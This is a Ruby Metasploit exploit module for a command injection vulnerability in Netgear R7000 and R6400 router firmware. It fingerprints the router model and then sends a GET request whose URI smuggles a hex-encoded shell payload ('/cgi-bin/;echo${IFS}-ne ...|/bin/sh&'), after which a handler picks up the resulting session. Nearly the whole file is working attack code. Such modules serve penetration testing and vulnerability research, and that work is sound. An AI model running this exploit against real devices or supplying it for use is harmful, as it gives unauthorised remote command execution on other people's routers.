##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Netgear R7000 and R6400 Command Injection",
      'Description'          => %q{
        This module exploits an arbitrary command injection vulnerability in
        Netgear R7000 and R6400 router firmware version 1.0.7.2_1.1.93 and possibly earlier.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => 'unix',
      'Author'               => ['thecarterb', 'Acew0rm'],
      'DefaultTarget'        => 0,
      'Privileged'           => false,
      'Arch'                 => [ARCH_CMD],
      'Targets'              => [
        [ 'Netgear firmware v1.0.7.2_1.1.93', { } ]
      ],
      'References'           =>
        [
          [ 'EDB', '40889'],
          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305'],
          [ 'URL', 'https://www.kb.cert.org/vuls/id/582384']
        ],
      'DisclosureDate' => 'Dec 06 2016',
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'EncoderType' => Msf::Encoder::Type::CmdUnixIfs,
        }
    ))

    register_options(
      [
        Opt::RPORT(80)
      ], self.class)
    end

  # Requests the login page which discloses the hardware, if it's an R7000 or R6400, return Detected
  def check
    res = send_request_cgi({'uri'=>'/'})
    if res.nil?
      fail_with(Failure::Unreachable, 'Connection timed out.')
    end
     # Checks for the `WWW-Authenticate` header in the response
    if res.headers["WWW-Authenticate"]
      data = res.to_s
      marker_one = "Basic realm=\""
      marker_two = "\""
      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
      print_status("Router is a NETGEAR router")
      if model == "R7000" || model == "R6400"
        print_good("Router is vulnerable (NETGEAR #{model})")
        return CheckCode::Detected
      end
    else
      print_error('Router is not a NETGEAR router')
      return CheckCode::Safe
    end
  end

  # Mostly from ddwrt_cgibin_exec.rb
  def exploit
    is_vuln = check
    if is_vuln != CheckCode::Detected
      return
    end
    cmd = payload.encoded.unpack("C*").map{|c| "\\x%.2x" % c}.join
    # TODO: force use of echo-ne CMD encoder
    str = "echo${IFS}-ne${IFS}\"#{cmd}\"|/bin/sh&"

    print_status("Sending GET request with encoded command line...")
    send_request_raw({ 'uri' => "/cgi-bin/;#{str}" })

    print_status("Giving the handler time to run...")
    handler

    select(nil, nil, nil, 10.0)
  end
end
